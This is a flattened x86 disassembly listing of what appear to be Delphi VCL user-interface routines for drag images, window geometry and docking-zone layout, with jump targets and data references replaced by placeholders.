mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41613c
call sub_433194
call sub_433274
test al al
jne r-xdata
call sub_433194
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_433418
push esp
push 0x1
push 0xf
push 0x0
call sub_433194
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_4332e4
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_447dbc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4444d4
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_447de0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447e20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447ee0
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d910
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_427eb0
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d910
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_427eb0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_447eec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44cebc
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_447f4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44cd80
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_447e20
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_447fac
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_447eec
push 0x0
call ShowCursor
sub_447fac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44cd80
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_448010
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_447de0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_448010
push ebx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_448034
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_447de0
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4480a8
push ebx
push esi
mov esi eax
mov eax esi
call sub_44cd80
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_448010
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_447f34
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4480f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4421c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43e88c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44814c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4422e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_44819c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4210c0
xor eax eax
push ebp
push sub_44823a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_4214ec
xor eax eax
push ebp
push sub_448217
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43e8a4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44821e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4214ec
retn
sub_44824c
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4482e0
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_448268
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4482e0
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_4488d8
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_4482e0
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_448314
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4483a4
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
mov edx 0x2
call sub_4483a4
jmp r-xdata
retn
sub_44835c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_448410
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
mov edx 0x2
call sub_448410
jmp r-xdata
retn
sub_4483a4
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_4487d8
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_448410
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_4482c4
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_4487d8
push eax
mov eax esi
call sub_448314
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_4487d8
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_4484c0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_4482c4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_4488d8
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_448410
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4482c4
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_448410
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_448314
mov edx eax
add edx esi
mov eax ebx
call sub_448800
mov edx edi
mov eax ebx
call sub_448800
jmp r-xdata
mov eax ebx
call sub_448660
mov eax ebx
call sub_4488b0
mov ebx eax
test ebx ebx
jne r-xdata
sub_448568
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404038
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40408c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_4485ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_4034e4
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_44861d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4409b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_448630
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_4488b0
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_448660
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_448410
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_448410
mov esi eax
push ebp
call sub_448630
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4488b0
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4483a4
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4483a4
mov ecx ebx
pop edx
call sub_416164
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f670
mov eax [ ebp - 0x4 ]
call sub_4487d8
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_4487d8
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4487d8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_4487d8
push ebx
mov ebx eax
mov eax ebx
call sub_4482e0
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_448268
test al al
je r-xdata
mov eax ebx
call sub_448314
pop ebx
retn
sub_448814
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448800
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4482b0
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_448804
mov edx esi
call sub_448814
sub_448850
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4487d8
mov edi eax
mov eax ebx
call sub_448314
cmp edi eax
jl r-xdata
mov eax esi
call sub_4484c0
mov eax [ esi + 0x1c ]
push eax
push sub_44a360
mov edx esi
call sub_448b8c
mov eax ebx
call sub_4487d8
mov edi eax
mov eax esi
call sub_44835c
cmp edi eax
jle r-xdata
mov eax ebx
call sub_448850
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_4488bc
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4482e0
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_4488e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4032b8
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_40360c
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44828c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420a90
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4278d4
mov edx eax
mov eax ebx
call sub_420c0c
mov eax [ ebp - 0x4 ]
call sub_448ab4
xor eax eax
push ebp
push sub_4489f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4431c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_4484c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4489f7
mov eax [ ebp - 0x4 ]
call sub_448ab8
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44318c
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4489f7
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_44a888
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_448a4c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_449ab8
mov eax [ esi + 0x10 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_448acc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_448acc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_448acc
pop ecx
sub_448b24
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_448acc
pop ecx
sub_448b50
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_448b50
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_448b50
pop ecx
sub_448ba4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_448b24
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_448410
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_448410
push eax
mov edx 0x1
mov eax ebx
call sub_4483a4
push eax
mov edx 0x2
mov eax ebx
call sub_4483a4
pop edx
pop ecx
call sub_416164
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402cfc
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_448c28
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_448660
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_416164
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43f670
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44828c
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_448b24
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_4482b0
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_449b50
mov edx esi
mov eax ebx
call sub_448b24
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43fc54
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44828c
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43fc40
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_448410
mov edx eax
mov eax edi
call sub_448800
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_448410
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_448410
mov edx eax
mov eax edi
call sub_448800
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_448410
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
